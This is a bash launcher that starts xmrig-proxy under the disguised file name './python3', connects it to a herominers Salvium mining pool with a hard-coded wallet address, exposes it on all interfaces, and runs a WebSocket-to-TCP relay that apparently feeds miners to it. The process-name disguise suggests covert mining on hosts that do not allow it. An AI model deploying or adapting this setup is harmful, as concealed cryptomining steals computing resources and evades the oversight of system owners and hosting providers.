#!/bin/bash
set -e

ID=${1:-001}
PORT=${2:-3000}
TCP_HOST=${3:-127.0.0.1}
TCP_PORT=${4:-3333}

export INSTANCE_ID=${ID}
export WS_PORT=${PORT}
export BACKEND_HOST=${TCP_HOST}
export BACKEND_PORT=${TCP_PORT}

XMRIG_PID=""

cleanup() {
    echo "[CLEANUP] Stopping xmrig-proxy..."
    if [[ -n "$XMRIG_PID" ]] && kill -0 "$XMRIG_PID" 2>/dev/null; then
        kill "$XMRIG_PID"
        wait "$XMRIG_PID" 2>/dev/null
        echo "[CLEANUP] xmrig-proxy stopped"
    fi
}

# bắt mọi kiểu cancel
trap cleanup EXIT INT TERM

# Start xmrig-proxy (background)
./python3 \
  --coin=XMR \
  -r 5 \
  -R 5 \
  --donate-level 0 \
  -b 0.0.0.0:${TCP_PORT} \
  -m simple \
  -o us.salvium.herominers.com:1230 \
  -u SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.${ID} \
  -p x \
  -k &

XMRIG_PID=$!
echo "[OK] xmrig-proxy started (PID=${XMRIG_PID})"

sleep 2

# Foreground process
./ws-tcp-proxy
